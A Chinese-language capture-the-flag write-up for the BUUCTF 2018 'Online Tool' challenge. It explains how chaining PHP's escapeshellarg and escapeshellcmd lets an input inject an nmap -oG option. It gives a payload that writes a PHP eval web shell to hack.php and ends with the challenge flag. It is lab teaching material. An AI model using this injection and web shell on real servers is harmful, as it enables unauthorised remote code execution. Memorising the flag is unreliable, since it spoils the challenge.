# [BUUCTF 2018]Online Tool

[题目地址](https://buuoj.cn/challenges#[BUUCTF%202018]Online%20Tool)

php总能给我带来惊喜。

给了源代码，直接懵逼，毫无头绪，用的函数都没见过。

```php
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```

前面就是配置之类的，[escapeshellarg](https://www.php.net/manual/zh/function.escapeshellarg.php)和[escapeshellcmd](https://www.php.net/manual/zh/function.escapeshellcmd.php)都是新玩意。看了官方文档有点云里雾里，于是又搜到了[这个](https://blog.csdn.net/LYJ20010728/article/details/116902085)。清晰多了，简述一下。两者都是用来防止命令注入的，前者可以让执行命令时无法使用多个参数，后者让执行命令时无法执行多条。

```
escapeshellarg:
(PHP 4 >= 4.0.3, PHP 5, PHP 7)
把字符串转码为可以在 shell 命令里使用的参数
string escapeshellarg ( string $arg )
escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符
概述：
1.确保用户只传递一个参数给命令
2.用户不能指定更多的参数一个
3.用户不能执行不同的命令

escapeshellcmd:
(PHP 4, PHP 5, PHP 7)
shell 元字符转义
string escapeshellcmd ( string $command )
escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义；反斜线（\）会在以下字符之前插入： &#;`|*?~<>^()[]{}$, \x0A 和 \xFF；' 和 " 仅在不配对儿的时候被转义；在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替
概述：
1.确保用户只执行一个命令
2.用户可以指定不限数量的参数
3.用户不能执行不同的命令
```

给出的链接里有关于这俩函数很好的例子。回到题本身，最后调用了system，绝对是命令注入了。程序本身功能是使用nmap扫提供的host，怎么构造payload？或许先把payload放出来再分析会更好。

```
?host=' <?php @eval($_POST["hack"]);?> -oG hack.php '
```

假装我们是程序，分析一下这串字符串在程序里的变化。取出host代表的字符串`' <?php @eval($_POST["hack"]);?> -oG hack.php '`然后escapeshellarg过后，字符串变成了这样：

```
''\''<?php @eval($_POST["hack"]);?> -oG hack.php '\'''
```

因为escapeshellarg函数实际上就干了这件事：给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号。“给字符串增加一个单引号”指的是被单引号分割成的部分的头和尾。比如payload里面有2个单引号，第一个单引号让开始和 `<?php @eval($_POST["hack"]);?> -oG hack.php '`两边加上单引号；第二个单引号又让`' <?php @eval($_POST["hack"]);?> -oG hack.php `和末尾啥也不是加上了单引号。继续，escapeshellcmd之后会咋样呢？

```
''\\''\<\?php @eval\(\$_POST\["hack"\]\)\;\?\> -oG hack.php '\\'''
```

escapeshellcmd还会转义字符串内已有的反斜杠。看起来结果好绕，实际上前面4个引号啥也不是，传给nmap的host为\<\?php @eval\(\$_POST\["hack"\]\)\;\?\>。-oG是一个选项，将命令和结果写到文件。总之无论它具体写什么，它都会把我们想要的木马写进去。文件名为hack.php，后4个引号同样没用，简直完美。如果觉得复杂可以用简化版本做个测试。

```php
<?php
$str="' <?php phpinfo();?> -oG hack.php '";
$str=escapeshellarg($str);
echo escapeshellcmd($str);
?>
```

系统有给上传地址。后面不用说了，连接快乐getshell。

## Flag
> flag{0229be70-ecaf-4cfe-8d6e-0752dc90a995}